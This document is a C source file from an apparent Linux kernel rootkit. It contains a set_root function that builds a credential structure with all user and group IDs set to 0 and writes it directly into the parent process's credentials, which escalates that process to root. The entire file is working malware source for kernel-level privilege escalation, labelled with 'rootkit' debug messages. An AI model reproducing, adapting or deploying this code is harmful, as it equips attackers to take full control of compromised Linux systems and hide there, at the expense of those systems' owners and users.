#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>

#include "../include/debug.h"

#include "include/privesc.h"

int set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
    {
        RKT_DEBUG("rootkit: Failed to prepare credentials.\n");
        return -1;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    struct task_struct *parent;
    parent = current->real_parent;

    // Commit the new credentials to the parent process
    if (!parent)
    {
        RKT_DEBUG("rootkit: Parent task not found.\n");
        return 1;
    }

    task_lock(parent); // Lock to modify safely

    parent->real_cred = root;
    parent->cred = root;

    task_unlock(parent); // Unlock after modification

    RKT_DEBUG("rootkit: Parent process privileges escalated successfully.\n"); 

    return 0;
}